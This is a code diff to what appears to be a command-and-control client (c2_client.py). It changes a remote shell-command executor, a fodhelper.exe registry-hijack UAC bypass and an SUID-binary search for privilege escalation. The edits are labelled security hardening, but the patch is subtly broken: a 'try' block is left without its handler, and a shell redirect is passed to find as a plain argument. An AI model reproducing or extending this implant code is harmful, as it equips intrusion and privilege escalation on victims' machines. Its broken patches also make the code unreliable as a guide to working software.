@@ -432,9 +432,17 @@ class C2Client(BaseC2):
         """Execute shell command and return output."""
         import subprocess
         try:
+            import shlex
+        try:
+            # Parse command safely
+            if isinstance(command, str):
+                cmd_args = shlex.split(command)
+            else:
+                cmd_args = command
+            
             result = subprocess.run(
-                command,
-                shell=True,
+                cmd_args,
+                shell=False,
                 capture_output=True,
                 text=True,
                 timeout=30
@@ -1311,7 +1319,12 @@ WantedBy=multi-user.target
             winreg.CloseKey(key)
 
             # Execute fodhelper.exe to trigger UAC bypass
-            subprocess.Popen(['fodhelper.exe'], shell=True)
+            # Use subprocess without shell=True for security
+            result = subprocess.run(['fodhelper.exe'], 
+                                   capture_output=True, 
+                                   text=True, 
+                                   shell=False,
+                                   timeout=5)
 
             # Clean up registry key
             winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
@@ -1322,12 +1335,25 @@ WantedBy=multi-user.target
                 'method': 'fodhelper',
                 'details': {
                     'registry_key': f"HKCU\\{key_path}",
-                    'executable': executable_path
+                    'executable': executable_path,
+                    'exit_code': result.returncode if result else None
                 }
             }
 
+        except subprocess.TimeoutExpired:
+            # Clean up registry key on timeout
+            try:
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            except:
+                pass
+            return {'success': False, 'message': 'fodhelper execution timed out'}
         except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
+            # Try to clean up registry key on error
+            try:
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
+            except:
+                pass
             return {'success': False, 'message': f'fodhelper UAC bypass failed: {e}'}
 
     def _windows_token_impersonation(self) -> Dict[str, Any]:
@@ -1517,7 +1543,10 @@ WantedBy=multi-user.target
         try:
             # Find SUID binaries
             cmd = ['find', '/', '-perm', '-4000', '-type', 'f', '2>/dev/null']
-            result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
+            # Use shlex to parse command safely
+            import shlex
+            cmd_args = shlex.split(cmd) if isinstance(cmd, str) else cmd
+            result = subprocess.run(cmd_args, capture_output=True, text=True, shell=False)
 
             if result.returncode == 0:
                 suid_binaries = result.stdout.strip().split('\n')
